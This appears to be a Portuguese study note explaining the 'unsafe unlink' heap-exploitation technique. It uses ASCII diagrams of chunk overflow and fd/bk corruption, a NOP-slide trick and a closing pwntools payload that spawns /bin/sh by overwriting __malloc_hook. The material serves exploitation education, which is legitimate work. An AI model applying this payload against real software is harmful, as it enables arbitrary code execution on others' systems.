# Unsafe Unlink

- [Unsafe Unlink](#unsafe-unlink)
- [Teoria](#teoria)
  - [Overflow](#overflow)
  - [Unlink](#unlink)
- [Ataque](#ataque)
- [Final](#final)

O Unsafe Unlink é o equivalente daquele BoF tradicional com 
o shellcode na stack, o mais básico de todos!

Assim, ele requer que NX e todas essas bobagens estejam 
desligadas... :P

# Teoria
## Overflow
```
 __________________
|         |  size  |  Nosso chunk
|                  |
|                  |
|__________________|
| prev_sz |  size  | Free chunk
|    fd   |   bk   |
|                  |
|__________________|


BBBBBBBuuuuuuuffffeeerr oooovveeerrrrfllloowww

 __________________
|         |  size  |  Nosso chunk
| AAAAAAAAAAAAAAAA |
| AAAAAAAAAAAAAAAA |
|__________________|
| AAAAAAA |  0x91  | Free chunk
| FFFFFFF | BBBBBB | obs: precisamos colocar
|                  |      um tamanho valido
|__________________|

Assim, nos alteramos o fd e o bk
```
## Unlink
```
Quando esse free chunk for alocado, ele precisara 
ser UN-LINKADO da free list

Fazer o proximo chunk apontar para o chunk anterior e o
chunk anterior apontar para o proximo chunk

Isto e:
    bk_velho = vitima.bk 
    fd_velho = vitima.fd

    vitima.fd.bk = bk_velho 
    vitima.bk.fd = fd_velho


assim:              vitima   
 ___   bk  ___       _V_       ___       ___ 
|   | --> |   | --> |   | --> |   | --> |   |
|___| <-- |___| <-- |___| <-- |___| <-- |___|
      fd              

            BK                  FD
 ___       _V_  BK.fd          _V_       ___ 
|   | --> |   | --> ----> --> |   | --> |   |
|___| <-- |___| <-- <---- <-- |___| <-- |___|              
                     ___ FD.bk
                    |   |
                    |_ _|
                      ^
                    vitima   
```
# Ataque
Assim, se substituirmos o `fd` e o `bk`, temos um 
primitivo de `reflected-write` !

Assim, nos escrevemos:
- `fd falso` em `bk falso + 0x18`
- `bk falso` em `fd falso + 0x10`

Portanto, os dois endereços precisam ser validos para 
nao gerar SEGFAULT ! D:

Isso nos deixa com poucas opções,.... porem nao existem
proteções então talvez seja possível!

Nos podemos colocar a payload no heap (sem `ASLR`, então 
temos o endereço dela, e sem `NX` então ela executa) e 
comprometer algum pointer que nos de execução, por exemplo:
- Qualquer um dos __malloc_hooks
- GOT (Sem `RELRO`)
- .dtors (ainda existia nos bins velhos)

Porem temos um problema: o write refletido, alem de 
fazer um pointer apontar para o nossa payload, acaba 
escrevendo um valor no meio da payload! :(

Assim, vamos precisar de um `NOP slide` especial!

```
90
  90
    90
      90    <---- Mira execução aqui
        90
          90
            JMP Payload ---------
              90                |
                90              |             
                  90            |    
corrupção  ---->    90          |
cai aqui              90        |
                        90      |
                          90    V
                            PAYLOAD
```

Assim, a payload fica intacta

> Obs: se voce tem um `write-after-free`, basta fazer
> - Overflow
> - Corrompe
> - Write: nova payload
> - Trigger

E colocando tudo isso junto:

# Final

```py
    asm("jmp shellcode;" + "nop;"*0x20 + "shellcode:" + shellcraft.execve("/bin/sh")) + 
    b'A'*pad + 
    flat(
      0x91,#                size
      heap - 0x18 + 0x28,#  fd - 0x18 | + 0x28 offset para o nosso chunk por exemplo
      __malloc_hook - 0x10,# bk - 0x10
    )
```